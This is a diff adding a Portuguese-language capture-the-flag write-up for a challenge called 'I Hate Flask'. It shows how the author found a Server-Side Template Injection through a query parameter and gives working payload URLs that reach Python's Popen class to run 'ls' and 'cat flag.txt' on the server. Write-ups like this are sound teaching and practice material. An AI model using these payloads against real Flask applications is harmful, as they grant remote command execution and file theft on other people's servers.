@@ -344,6 +344,29 @@ if(document.getElementByName("username").value === "foo" && document.getElementB
 colocando então os valores de usuário e senha no formulário a flag é exibida
 
 ### I Hate Flask ###
+Esse desafio nos apresenta uma página bastante simples, com somente um index e uma mensagem 
+```html
+I love Flask & Flask
+```
+E nos dá a dica também que este sistema é construído utilizando o framework Flask.
+Ao consultar sobre vulnerabilidades nesse framework encontro uma chamada Server-Side Template Injection (SSTI) e resolvo testá-la no site. Envio então um parâmetro arbitrário quetry string de nome 'name', com valor 'Leo' e de fato percebo que a saudação da página é influenciada por esse query.
+```html
+I love Flask & Leo
+```
+Parece que estamos no caminho certo, então descubro que é possível injetar código Python no template através dessa query, e seguindo então o passo a passo abaixo nós 'navegamos' na estrutura de classes disponíveis no servidor, partindo de uma simples string vazia.
+
+```html
+http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()}} <!-- Aqui descubro que a classe Python desejada POpen está disponível no índice 222-->
+http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222]}} <!-- Acesso ela -->
+http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222](%27ls%27,shell=True,stdout=-1).communicate()}} <!-- Fazendo uso dela para executar um ls -->
+http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222](%27cat%20flag.txt%27,shell=True,stdout=-1).communicate()}} <!-- Agora sim, nossa flag.txt -->
+```
+
+É exibida no próprio template da página! <3
+
+```html
+I love Flask & ZUP-CTF{Eu_4ind4_4M0_FLaSK_SST1}
+``` 
 
 
 # Ferramentas #
